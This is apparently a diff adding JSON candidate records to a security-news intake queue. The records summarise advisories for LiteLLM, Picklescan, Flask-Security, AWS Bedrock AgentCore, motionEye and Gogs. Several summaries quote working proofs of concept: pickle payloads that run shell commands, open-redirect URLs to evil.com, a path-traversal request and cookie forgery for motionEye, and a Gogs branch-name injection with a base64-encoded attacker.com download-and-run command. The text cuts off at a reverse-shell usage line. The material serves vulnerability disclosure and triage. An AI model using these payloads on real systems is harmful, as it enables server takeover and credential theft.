+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-dcda3b718055927c",
+      "canonicalSubjectId": "CVE-2026-47101",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "LiteLLM allows an authenticated internal_user to create API keys with access to routes that their role does not permit",
+      "summary": "LiteLLM prior to 1.83.14 allows an authenticated internal_user to create API keys with access to routes that their role does not permit. When generating a key, the allowed_routes field is stored without verifying that the specified routes fall within the user's own permissions. A key created with access to admin-only routes can then be used to reach those routes successfully, bypassing the role-based access controls that would otherwise block the request, enabling full privilege escalation from internal_user to proxy_admin.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-qrc4-49gv-mv9m"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-qrc4-49gv-mv9m"
+      ],
+      "firstSeenAt": "2026-05-21T21:30:36.000Z",
+      "lastMaterialActivityAt": "2026-06-23T22:47:40.000Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "matched",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [
+          {
+            "id": "pkg-pypi-litellm",
+            "name": "litellm",
+            "ecosystem": "pypi"
+          }
+        ],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "reverify_existing",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 52,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "connects to existing Supply Chain graph"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-7f23335027f84dea",
+      "canonicalSubjectId": "CVE-2025-71361",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "Picklescan has a missing detection when calling built-in python idlelib.calltip.Calltip",
+      "summary": "### Summary Using idlelib.calltip.Calltip.fetch_tip, which is a built-in python library function to execute remote pickle file. ### Details The attack payload executes in the following steps: First, the attacker craft the payload by calling to idlelib.calltip.Calltip.fetch_tip function in reduce method Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution. ### PoC ``` class EvilCalltipFetchTip: def __reduce__(self): from idlelib.calltip import Calltip # fetch_tip(expression) -> get_entity(expression) -> eval(expression) return Calltip().fetch_tip, (\"__import__('os').system('whoami')\",) ``` ### Impact Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded. Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects. ### Corresponding https://github.com/FredericDT https://github.com/Qhaoduoyu",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/GHSA-8r4j-24qv-fmq9",
+        "https://github.com/advisories/GHSA-8r4j-24qv-fmq9"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-8r4j-24qv-fmq9",
+        "osv:GHSA-8r4j-24qv-fmq9"
+      ],
+      "firstSeenAt": "2025-08-26T18:38:43.000Z",
+      "lastMaterialActivityAt": "2026-06-24T13:15:09.047Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p2",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 46,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-bb117f811493eb76",
+      "canonicalSubjectId": "CVE-2025-71354",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "Picklescan has a missing detection when calling built-in python idlelib.debugobj.ObjectTreeItem",
+      "summary": "### Summary Using idlelib.debugobj.ObjectTreeItem.SetText, which is a built-in python library function to execute remote pickle file. ### Details The attack payload executes in the following steps: First, the attacker craft the payload by calling to idlelib.debugobj.ObjectTreeItem.SetText function in reduce method Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution. ### PoC ``` class EvilDebugobjSetText: def __reduce__(self): from idlelib.debugobj import ObjectTreeItem # ObjectTreeItem(..., setfunction=print).SetText(cmd) return ObjectTreeItem(\"label\", None, print).SetText, (\"__import__('os').system('whoami')\",) ``` ### Impact Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models. What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded. Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects. ### Corresponding https://github.com/FredericDT https://github.com/Qhaoduoyu",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/GHSA-3vg9-h568-4w9m",
+        "https://github.com/advisories/GHSA-3vg9-h568-4w9m"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-3vg9-h568-4w9m",
+        "osv:GHSA-3vg9-h568-4w9m"
+      ],
+      "firstSeenAt": "2025-08-26T18:36:42.000Z",
+      "lastMaterialActivityAt": "2026-06-24T13:15:09.043Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p2",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 46,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-d8418a60545e97a7",
+      "canonicalSubjectId": "CVE-2023-49438",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "Flask-Security has an Open Redirect issue",
+      "summary": "# Open Redirect in Flask-Security ## Summary `flask_security.utils.validate_redirect_url()` can allow an attacker-controlled redirect URL when subdomain redirects are enabled. The bypass uses a backslash inside the URL authority/host: ```text http://evil.com\\.whitelist.com http://evil.com%5C.whitelist.com ``` Python's `urlsplit()` parses the full authority as `evil.com\\.whitelist.com` or `evil.com%5C.whitelist.com`. Because the value ends with `.whitelist.com`, `validate_redirect_url()` accepts it as an allowed subdomain of `whitelist.com`. This is similar in class to the previous Flask-Security-Too open redirect advisory CVE-2023-49438 / GHSA-672h-6x89-76m5, where crafted redirect URLs bypassed validation through browser URL normalization behavior. ## Affected Configuration The issue requires subdomain redirects to be enabled: ```python SERVER_NAME = \"whitelist.com\" SECURITY_REDIRECT_ALLOW_SUBDOMAINS = True ``` Tested environment: ```text Flask-Security: 5.8.0 Flask: 3.1.3 Werkzeug: 3.1.8 ``` ## Impact An attacker can craft a URL that passes Flask-Security's redirect validation and produces a `302` response to an attacker-controlled URL-like authority. This can be used for phishing or other attacks that rely on a trusted application redirecting users to an attacker-controlled destination. ## Proof of Concept ### PoC Flask App ```python from __future__ import annotations from importlib.metadata import version from urllib.parse import urlsplit from flask import Flask, jsonify, redirect, request from flask_security.utils import validate_redirect_url app = Flask(__name__) app.config.update( SECRET_KEY=\"poc-only\", SERVER_NAME=\"whitelist.com\", SECURITY_REDIRECT_ALLOW_SUBDOMAINS=True, SECURITY_REDIRECT_BASE_DOMAIN=None, SECURITY_REDIRECT_ALLOWED_SUBDOMAINS=[], ) @app.get(\"/\") def index(): return jsonify( flask_version=version(\"Flask\"), configured_server_name=app.config[\"SERVER_NAME\"], examples=[ r\"http://evil.com\\.whitelist.com\", \"http://evil.com%5C.whitelist.com\", \"http://sub.whitelist.com\", \"http://sub.not-whitelist.com\", ], ) @app.get(\"/check\") def check(): next_url = request.args.get(\"next\", \"\") parsed = urlsplit(next_url) return jsonify( next=next_url, valid=validate_redirect_url(next_url), parsed={ \"scheme\": parsed.scheme, \"netloc\": parsed.netloc, \"hostname\": parsed.hostname, \"path\": parsed.path, }, ) @app.get(\"/redir\") def redir(): next_url = request.args.get(\"next\", \"\") if not validate_redirect_url(next_url): return jsonify(error=\"blocked\", next=next_url), 400 return redirect(next_url) if __name__ == \"__main__\": app.run(host=\"127.0.0.1\", port=5000, debug=False) ``` ### Steps to Reproduce Run the PoC with the target project's Flask version: ```bash .venv/bin/python poc_redirect_app.py ``` The invalid comparison case is correctly blocked: ```bash http://127.0.0.1:5000/redir?next=http://evil.com ``` Observed result: <img width=\"1019\" height=\"294\" alt=\"image\" src=\"https://github.com/user-attachments/assets/de25ac4d-b37f-4369-928e-f44dfd5b7557\" /> Check the validation result: ```bash http://127.0.0.1:5000/check?next=http://evil.com%5C.whitelist.com ``` Observed result: <img width=\"1029\" height=\"634\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8e5ec8a6-42a4-438a-8d12-a27724519091\" /> ## References - CVE-2023-49438: https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438/ - GHSA-672h-6x89-76m5: https://osv.dev/vulnerability/CVE-2023-49438 - NVD entry for CVE-2023-49438: https://nvd.nist.gov/vuln/detail/CVE-2023-49438",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-w2j7-f3c6-g8cw"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-w2j7-f3c6-g8cw"
+      ],
+      "firstSeenAt": "2026-06-23T22:46:31.000Z",
+      "lastMaterialActivityAt": "2026-06-23T22:46:32.000Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p2",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 46,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-9ec4ff3855b21995",
+      "canonicalSubjectId": "CVE-2026-12530",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "Improper neutralization of argument delimiters in AWS Bedrock AgentCore Python SDK install_packages()",
+      "summary": "### Summary The AWS Bedrock AgentCore Python SDK (bedrock-agentcore) is an open-source SDK that enables developers to build, deploy, and manage agents on AWS Bedrock AgentCore. An issue exists in the install_packages() method of the Code Interpreter client where crafted package name arguments can bypass input validation and allow a remote authenticated user to execute arbitrary commands within the Code Interpreter sandbox. ### Impact The install_packages() method constructs a 'pip install' shell command executed within the Code Interpreter sandbox using package name arguments provided by the caller. The method applied an incomplete blocklist that allowed crafted package name arguments - specifically pip flags such as '--index-url' and '-r' - to pass validation unchecked. A remote authenticated user who can influence the arguments passed to install_packages() could redirect package resolution to a third-party-controlled PyPI server, or expose the contents of arbitrary sandbox files and environment variables. **Impacted versions:** AWS Bedrock AgentCore Python SDK (bedrock-agentcore) versions >= 1.1.3 and < 1.6.1 ### Patches This issue has been addressed in bedrock-agentcore version 1.6.1. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. ### Workarounds If you are unable to upgrade immediately, avoid passing any user-supplied or externally-influenced strings directly to install_packages(). Restrict calls to a fixed, hardcoded list of approved package names within your application code. ### References If you have any questions or comments about this advisory, we ask that you contact AWS Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue. We would like to thank Sergio Garcia for collaborating on this issue through the coordinated vulnerability disclosure process.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-6rfw-mq36-jm8h"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-6rfw-mq36-jm8h"
+      ],
+      "firstSeenAt": "2026-06-19T14:46:33.000Z",
+      "lastMaterialActivityAt": "2026-06-23T19:20:32.000Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p2",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 46,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-a4f9bcba9bd114e6",
+      "canonicalSubjectId": "GHSA-PHV5-334H-MXCW",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "motionEye Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal",
+      "summary": "# Partial Authentication Bypass: Unauthenticated Admin Credential Theft via Path Traversal ### Summary Myself and others have reported several RCE vulnerabilities to this project. However, due to the nature of the app, these are largely not of all that much value, as there is built-in functionality to run commands upon certain actions — i.e. RCE is by design. With that in mind, I endeavored to find some sort of auth bypass, and was slightly successful. When the admin password is set but the normal (surveillance) user password is left empty (the default), an unauthenticated attacker can exploit a path traversal vulnerability to read the motionEye configuration file from disk. This file contains the admin password as a SHA-1 hash, and that hash is accepted directly as a signing key for admin API requests — no cracking required. The result is full admin access from zero credentials. This is a realistic scenario: many installations set an admin password to protect the settings UI but leave the normal user password empty so household members can view camera feeds without logging in. ### Details The vulnerability chains two independent issues: **1. Unauthenticated normal-user access when `@normal_password` is empty** In `motioneye/handlers/base.py`, lines 149-151: ```python # no authentication required for normal user if not username and not normal_password: return 'normal' ``` When `@normal_password` is empty (the default — see `config.py` line 2251: `data.setdefault('@normal_password', '')`), any request without a `_username` parameter is silently granted `normal` user access. This is by design for convenience, but it means all normal-level endpoints are fully unauthenticated. **2. Path traversal in `MoviePlaybackHandler` (and related handlers)** The movie playback handler at `motioneye/handlers/movie_playback.py` serves recorded video files. It accepts a filename in the URL path: ``` GET /movie/<camera_id>/playback/<filename> ``` The filename is passed to `mediafiles.get_media_path()` (`mediafiles.py` lines 497-500): ```python def get_media_path(camera_config, path, media_type): target_dir = camera_config.get('target_dir') full_path = os.path.join(target_dir, path) return full_path ``` When `path` is an absolute path (e.g. `/etc/motioneye/motion.conf`), Python's `os.path.join()` discards `target_dir` entirely and returns the absolute path as-is. This would normally be caught by Tornado's `StaticFileHandler` path validation, but `MoviePlaybackHandler` explicitly overrides both safety checks (`movie_playback.py` lines 111-115): ```python def get_absolute_path(self, root, path): return path def validate_absolute_path(self, root, absolute_path): return absolute_path ``` This allows reading any file on the filesystem that the motionEye process can access. The same path traversal exists in the movie download, picture download, and picture preview handlers: - `GET /movie/<camera_id>/download/<filename>` - `GET /picture/<camera_id>/download/<filename>` - `GET /picture/<camera_id>/preview/<filename>` **3. Admin hash stored in a readable config file and accepted directly as a signing key** motionEye stores the admin password as `SHA1(plaintext)` in its main configuration file (`motion.conf`), written as a comment line: ``` # @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db ``` The authentication code in `base.py` (lines 137-147) accepts signatures computed with **either** the raw stored hash or `SHA1(stored_hash)` as the signing key: ```python if username == admin_username and ( signature == utils.compute_signature( self.request.method, self.request.uri, self.request.body, admin_password ) or signature == utils.compute_signature( self.request.method, self.request.uri, self.request.body, admin_hash ) ): return 'admin' ``` Here `admin_password` is the raw value from the config file (the SHA-1 hash), and `admin_hash` is `SHA1(admin_password)` — a hash of the hash. Since the stored value is already a SHA-1 hash, and it is accepted directly as a valid signing key, there is no need to crack it. The attacker can use the stolen hash immediately. Furthermore, the client-side JavaScript (`static/js/main.js` line 3631) computes `sha1(plaintext_password)` and stores it in the `meye_password_hash` cookie as the signing key. This is the same value as `@admin_password` in the config file. ### PoC **Step 1** — Read the config file (unauthenticated, requires empty normal password): ``` GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1 Host: target:8765 ``` Response contains: ``` # @admin_username admin # @admin_password 7b7d55439abccf4ae83047c1af2707e6eb6664db ``` **Step 2** — Use the hash to become admin. In the browser console: ```javascript document.cookie = \"meye_username=admin; path=/\"; document.cookie = \"meye_password_hash=7b7d55439abccf4ae83047c1af2707e6eb6664db; path=/\"; location.reload(); ``` The page reloads with full admin access. All subsequent requests are signed with the stolen hash. **Step 3 (optional)** — Achieve RCE via the admin config API. The admin can set `command_notifications_exec` or `command_storage_exec` to arbitrary shell commands, which are written into motion event hooks and executed by the motion daemon: ``` POST /config/1/set HTTP/1.1 Content-Type: application/json {\"command_notifications_enabled\": true, \"command_notifications_exec\": \"touch /tmp/pwned\", ...} ``` ### Impact - **Privilege escalation from zero credentials to full admin** on any installation where the admin password is set but the normal user password is left empty (the default configuration). - **Arbitrary file read** of any file readable by the motionEye process (typically running as `motion` user, or `root` on motionEyeOS). This includes `/etc/passwd`, `/etc/shadow` (if permissions allow), SSH keys, and application secrets. - **Full remote code execution** — once admin access is obtained, the attacker can inject arbitrary shell commands via motion event hooks (`command_notifications_exec`, `command_storage_exec`, or `web_hook_storage_url`). Commands execute as the motion daemon user. - **Realistic attack surface** — this is a common configuration for home surveillance setups where the admin password protects settings but camera feeds are left open for household members. Public instances are discoverable via Shodan (`http.favicon.hash:1898775751`). ### Suggested Fix 1. The path traversal should be fixed by validating that the resolved path stays within the camera's `target_dir`. Do not override `get_absolute_path` and `validate_absolute_path` to bypass Tornado's built-in protections. At minimum, reject absolute paths in the filename parameter. 2. Consider warning users in the UI when the normal user password is empty, as this makes all normal-level endpoints (including the vulnerable file handlers) fully unauthenticated. 3. The admin password hash should not be stored in a file that is served by the same file handlers used for media content. Alternatively, the `@` metadata lines should be moved to a separate configuration file that is not within any camera's media path.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-phv5-334h-mxcw"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-phv5-334h-mxcw"
+      ],
+      "firstSeenAt": "2026-06-23T19:09:29.000Z",
+      "lastMaterialActivityAt": "2026-06-23T19:09:29.000Z",
+      "activityBasis": [
+        "advisory_updated"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p2",
+        "effectiveActiveStatus": "none",
+        "activeStatus": "none",
+        "activeStatusExpiresAt": null,
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 46,
+      "rankReasons": [
+        "current lead",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-639b2329b64f5987",
+      "canonicalSubjectId": "CVE-2024-39930",
+      "subjectType": "cve",
+      "proposedArchetype": "incident",
+      "title": "Gogs vulnerable to RCE via git rebase --exec argument injection in pull request merge",
+      "summary": "# Gogs: RCE via `git rebase --exec` Argument Injection in PR Merge ## Summary Gogs allows authenticated users to achieve Remote Code Execution (RCE) on the server by creating a pull request with a specially crafted branch name that injects the `--exec` flag into the `git rebase` command during the \"Rebase before merging\" merge operation. ## Severity **Critical** - CVSS 3.1 Base Score: 9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) ## Affected Versions - **Gogs 0.14.2** (latest supported release) - Gogs 0.15.0+dev (commit `b53d3162`, main branch as of 2026-03-16) - All prior versions that support the \"Rebase before merging\" merge style ## Impact This is a **privilege escalation from authenticated user to server-level code execution**. The attacker uses their own repository as the delivery mechanism - the target is not the repository but the Gogs server itself. On any multi-tenant Gogs instance (company, university, open source hosting), this gives one authenticated user full control of the underlying server: - **Server compromise**: Arbitrary command execution as the Gogs process user - **Cross-tenant data breach**: Read ALL repositories on the instance, including other users' private repos - **Credential theft**: Access the database containing password hashes, API tokens, SSH keys, and 2FA secrets for every user - **Lateral movement**: Pivot to other systems accessible from the server's network - **Supply chain attacks**: Silently modify any hosted repository's code. The Gogs process user (typically `git`) has direct filesystem-level read/write access to every repository on the instance under a single `REPOSITORY_ROOT` directory (default: `~/gogs-repositories`). There is no OS-level isolation between repositories; all access control is application-layer only. The vulnerability affects all supported platforms (Linux, macOS, Windows) and installation methods (pre-built binary, Docker, source). On Docker installations, the Gogs process runs as the `git` user (UID 1000 by default). The severity is heightened because: - **Open registration by default**: Gogs ships with `DISABLE_REGISTRATION = false`, meaning anyone can create an account on a default-configured instance - effectively making this exploitable by an unauthenticated attacker. - **No admin required**: Any user who creates a repository is automatically its admin. Enabling rebase is a single toggle in Settings > Advanced - no site-admin intervention, no special permissions, and no interaction with other users required. The attacker creates a repo, enables rebase, and exploits, all within their own account. (Note: `PullsAllowRebase` defaults to `false`, but this is irrelevant since any repo creator can enable it themselves.) - The attacker operates entirely within their own repo - no interaction with or access to other users' repos is needed to trigger the exploit - The exploit is fully automatable (see PoC) - The exploit leaves minimal traces (a 500 error in server logs, easily missed) ## Prerequisites The attacker needs **one** of the following: - **Repo admin/owner** on any repository (can enable rebase + create PR + merge) - **any user who creates a repo has this by default** - **Write access** to a repository where \"Rebase before merging\" is already enabled by the owner (can create malicious branch + PR + merge) Note: \"Rebase before merging\" is NOT enabled by default (`PullsAllowRebase` defaults to `false` in `internal/database/repo.go:215`). However: - Any user who creates their own repository is admin of that repo and can enable rebase via Settings > Advanced - The repo settings endpoint (`/settings`, action=`advanced`) requires `reqRepoAdmin` middleware (`internal/cmd/web.go:472`) - collaborators with only write access cannot enable it, but repo owners/admins can - Many organizations enable rebase merge as a standard practice ## Root Cause Analysis In `internal/database/pull.go`, the [`Merge()` function](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L282) passes the PR's base branch name to `git rebase` as a positional argument without a `--` separator: ```go if _, stderr, err = process.ExecDir(-1, tmpBasePath, fmt.Sprintf(\"PullRequest.Merge (git rebase): %s\", tmpBasePath), \"git\", \"rebase\", \"--quiet\", pr.BaseBranch, remoteHeadBranch); err != nil { ``` The `pr.BaseBranch` value originates from the [URL parameter](https://github.com/gogs/gogs/blob/v0.14.2/internal/route/repo/pull.go#L447) in `internal/route/repo/pull.go`: ```go baseRef := infos[0] // from strings.Split(c.Params(\"*\"), \"...\") ``` Both `baseRef` and `headRef` are validated via [`RevParse`](https://github.com/gogs/gogs/blob/v0.14.2/internal/route/repo/pull.go#L482) (defined in the external [`git-module`](https://github.com/gogs/git-module) library), but this only calls `git rev-parse --verify <ref>` - it checks that the ref resolves to a valid git object, not that it is safe against argument injection. Since the attacker pushes the malicious branch name to the repository, `RevParse` succeeds because the ref genuinely exists. The value is stored in the database and later passed as-is to the `git rebase` command without a `--` separator. ## Exploitation Git branch names can legally contain characters `$`, `{`, `}`, `=`, `-`. The attacker creates a branch named: ```bash --exec=touch${IFS}/tmp/rce_proof ``` When used as `pr.BaseBranch` in the rebase command: ```bash git rebase --quiet '--exec=touch${IFS}/tmp/rce_proof' 'head_repo/feature' ``` 1. Git's argument parser treats `--exec=touch${IFS}/tmp/rce_proof` as the `--exec` flag 2. The `--exec` flag specifies a command to run via `sh -c` after each replayed commit 3. `${IFS}` expands to a space in the shell, bypassing git's prohibition on spaces in branch names 4. The command `touch /tmp/rce_proof` executes as the Gogs server process user For commands containing characters forbidden in git refs (`:`, `~`, `^`, `?`, `*`, `[`, `\\`, `//`), such as URLs, the attacker base64-encodes the payload: ```bash --exec=echo${IFS}<base64>|base64${IFS}-d|sh ``` For example, `curl https://attacker.com/shell.sh|sh` becomes: ```bash --exec=echo${IFS}Y3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaHxzaA==|base64${IFS}-d|sh ``` This was validated end-to-end: a `wget` command with a URL executed inside the Docker container and wrote the fetched HTML to disk. ### Full Execution Flow in `Merge()` The `MergeStyleRebase` code path in `Merge()` executes these git commands sequentially: | Step | Command | Result with malicious branch | | ---------------------------------------------------------------------------------- | --------------------------------------------------------- | ---------------------------------------------------------------------------- | | [1](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L233) | `git clone -b '<malicious>' <repo> <tmp>` | **Succeeds** - `-b` consumes `--exec=...` as the branch value | | [2](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L238-L248) | `git remote add head_repo <repo>` + `git fetch head_repo` | Succeeds normally | | [3](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L282) | `git rebase --quiet '<malicious>' 'head_repo/feature'` | **RCE fires here** - `--exec=<cmd>` parsed as flag, command runs via `sh -c` | | [4](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L290) | `git checkout -b <tmpBranch>` | Succeeds (tmpBranch is a server-generated timestamp) | | [5](https://github.com/gogs/gogs/blob/v0.14.2/internal/database/pull.go#L297) | `git checkout '<malicious>'` | **Fails** - git interprets `--exec=...` as invalid option for checkout | Step 5 failure causes `Merge()` to return an error (HTTP 500), but **the RCE has already executed at Step 3**. The 500 error is logged but does not prevent exploitation. Defenders can look for this IOC in server logs: ```log [E] ...merge: git checkout '--exec=<...>': exit status 128 - error: unknown option `exec=<...>' ``` This is logged via [`c.Error(err, \"merge\")`](https://github.com/gogs/gogs/blob/v0.14.2/internal/route/repo/pull.go#L419) at ERROR level. ### Why the PR Becomes Mergeable The `testPatch()` function (called during PR creation at line 468) calls `UpdateLocalCopyBranch(pr.BaseBranch)` (`internal/database/repo.go:658`), which has two code paths: - **No local copy exists** (first call for a repo): Calls `git.Clone()` (line 664), which includes `--end-of-options` → the malicious branch name is treated as data, clone succeeds, and `testPatch` completes normally. - **Local copy already exists** (subsequent calls): Calls `gitRepo.Checkout(branch)` (line 684), which is missing `--end-of-options` → git interprets `--exec=...` as a flag → checkout fails → `testPatch` returns an error. The exploit relies on the following causal chain: 1. During PR creation (`NewPullRequest`, line 468), `testPatch()` is called. For a **fresh repository** with no local copy, the Clone path succeeds. 2. Because `testPatch` didn't set the status to `PullRequestStatusConflict`, the status remains `PullRequestStatusChecking`, and the code at line 472-473 promotes it to `PullRequestStatusMergeable`. 3. The background `TestPullRequests` goroutine (line 840) periodically re-checks PRs. When it calls `testPatch` again, the local copy now exists, so `UpdateLocalCopyBranch` takes the Checkout path → fails → returns an error. 4. This error causes `TestPullRequests` to skip adding the PR to the update list (`return nil` at line 855) or skip `checkAndUpdateStatus()` (`continue` at line 877). Because `checkAndUpdateStatus` is never called, **the PR status remains at Mergeable indefinitely**. The PoC handles this by creating a **fresh repository** (no local copy exists yet), ensuring the first `testPatch` succeeds via the Clone path. ### Proof of Concept A standalone Python exploit (`gogs-rebase-rce.py`) is attached to this advisory. It automates the full exploit chain (authentication, repo creation, rebase enablement, payload delivery, PR creation, merge trigger, and cleanup) and supports both Linux and Windows targets. Requires Python 3.8+, `requests`, and a local `git` installation. #### Usage ```bash # Reverse shell (Linux) python3 gogs-rebase-rce.py -t http://gogs:3000 -u 